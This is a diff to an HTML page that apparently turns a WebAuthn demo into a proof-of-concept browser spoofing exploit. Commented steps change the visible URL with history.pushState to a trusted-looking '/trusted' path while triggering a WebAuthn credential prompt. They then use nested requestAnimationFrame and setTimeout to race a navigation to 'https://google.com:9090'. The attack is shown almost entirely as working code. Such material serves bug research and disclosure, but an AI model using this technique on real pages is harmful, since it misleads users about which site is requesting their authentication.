@@ -2,14 +2,43 @@
 <html>
 <head>
   <meta charset="UTF-8">
-  <title>WebAuthn Demo</title>
+  <title>WebAuthn Navigation Demo</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      margin: 0;
+      height: 100vh;
+    }
+    #panel {
+      display: none;
+      padding: 20px;
+      background: #eee;
+    }
+    #trigger {
+      margin: 40px;
+      padding: 12px 20px;
+      font-size: 16px;
+    }
+  </style>
 </head>
 <body>
 
-<button id="authBtn">Verify to Continue</button>
+<button id="trigger">Continue</button>
+<div id="panel">Trusted panel</div>
 
 <script>
-document.getElementById("authBtn").onclick = async () => {
+const trigger = document.getElementById('trigger');
+const panel = document.getElementById('panel');
+
+/*
+ * Step 1:
+ * Manipulate visible URL to a trusted-looking path
+ * + trigger WebAuthn
+ */
+trigger.onclick = async () => {
+  history.pushState({}, '', '/trusted');
+  panel.style.display = 'block';
+
   try {
     await navigator.credentials.get({
       publicKey: {
@@ -22,6 +51,20 @@ document.getElementById("authBtn").onclick = async () => {
     console.log(e);
   }
 };
+
+/*
+ * Step 2:
+ * Trigger a navigation race shortly after permission flow starts
+ */
+window.addEventListener('pageshow', () => {
+  requestAnimationFrame(() => {
+    requestAnimationFrame(() => {
+      setTimeout(() => {
+        location.href = 'https://google.com:9090';
+      }, 80);
+    });
+  });
+});
 </script>
 
 </body>
